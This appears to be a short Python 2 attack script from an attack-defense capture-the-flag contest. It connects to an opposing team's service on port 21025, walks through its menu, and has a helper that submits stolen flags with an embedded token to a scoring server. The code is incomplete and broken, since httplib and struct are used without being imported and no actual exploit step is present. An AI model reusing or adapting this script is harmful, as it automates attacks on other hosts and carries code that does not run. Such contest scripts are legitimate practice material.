import socket, time

def sendkey(key):
    conn = httplib.HTTPConnection("10.217.0.100")
    conn.request("GET",
    "/team/submit_key?token=807945f0c3446e6fea2b7c109edb9a01&key=%s" % (key))
    r1 = conn.getresponse()
    print r1.read()


def W(sc, x):
	sc.send(x)
	time.sleep(0.3)

def R(sc):
	return sc.recv(40960)

def PI(sc, x):
	return struct.pack('I', x)

def UI(sc, s):
	return struct.unpack('I', s)[0]

for i in range(1, 2):
    sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sc.settimeout(5)
    sc.connect(('10.217.%d.201'%i, 21025))

    W(sc, '7')
    R(sc)
    W(sc, '2')
    R(sc)
    W(sc, '3')
    R(sc)
    W(sc, '1')
    R(sc)
    W(sc, '1')
    pid = R(sc)
    print pid
    W(sc, '7')
    R(sc)
    W(sc, '4')
    R(sc)

